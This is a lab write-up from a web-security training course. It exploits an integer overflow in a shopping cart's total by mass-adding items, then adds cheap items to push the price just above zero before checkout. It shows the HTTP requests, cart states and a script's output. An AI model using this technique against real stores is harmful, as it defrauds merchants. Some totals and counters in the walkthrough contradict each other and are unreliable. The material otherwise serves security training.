# Lab: Low-level logic flaw

### Instructions

This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: `wiener:peter` 

### Solution

Logging in with the provided credentials, we add the jacket to our cart and capture the request in Burp:

```
POST /cart HTTP/2
Host: 0ae8009f03adfecd812bfdeb009900eb.web-security-academy.net
Cookie: session=n4wntXasHkxumkHSFOZAKXMTjyfzHN7q

productId=1&redir=PRODUCT&quantity=1
```

Unlike the high-level lab, we can't just pass a negative quantity here because the server rejects it. So we need a different approach.

The vulnerability here is that the server stores the cart total as a signed 32-bit integer in cents. That means the maximum value it can hold is `2,147,483,647` ($21,474,836.47). If we push the total past that limit it wraps around to a large negative number. This is the integer overflow.

We need to add enough jackets to trigger that overflow. Send the add-to-cart request to Intruder, set `quantity` to `99` and use Null payloads to repeat the request. Null payloads just resend the same request unchanged, so every repeat adds another 99 jackets:

```
productId=1&redir=PRODUCT&quantity=99
```

Run it for 324 repeats (324 × 99 = 32,076 jackets), then manually send one final request with `quantity=47` to bring the total to 32,123. Checking the cart now shows:

```
Lightweight "l33t" Leather Jacket   $1337.00   32123
Total:  -$1221.96
```

The price has overflowed into negative territory. We can't checkout yet though because the server blocks negative totals.

We need to add a cheap item to nudge the total back above $0. Looking at the store, we find the cheapest item and work out how many we need:

```
1221.96 / 5.18 = 235.9  →  round up to 236
```

We round up because we need to land just above zero, not stay negative. Send the cheap item add-to-cart request to Intruder, same approach: Null payloads, batches of 99, until we've added 236. Checking the cart:

```
Lightweight "l33t" Leather Jacket   $1337.00    32123
Single Use Food Hider               $5.18       236
Total:  $0.34
```

We can afford $0.34 with our store credit, so we checkout and the lab is solved.

### Python Solution

See `logic_vuln_05.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Business_Logic_Vulnerabilities/Logic_Vuln_05_low-level_logic_flaw]
└─$ python logic_vuln_05.py https://0ae8009f03adfecd812bfdeb009900eb.web-security-academy.net/ 
[+] Login successful
[+] Cheapest product: id=3 @ $5.18
[+] Added product 1 to cart: 32123 / 321233
[+] Cart total after jackets: $1221.96
[+] Adding 236 x product 3 to bring total above $0
[+] Added product 3 to cart: 236 / 2366
[+] Final cart total: $0.52
[*] Attempting checkout...
[+] Checkout successful - Lab solved!
```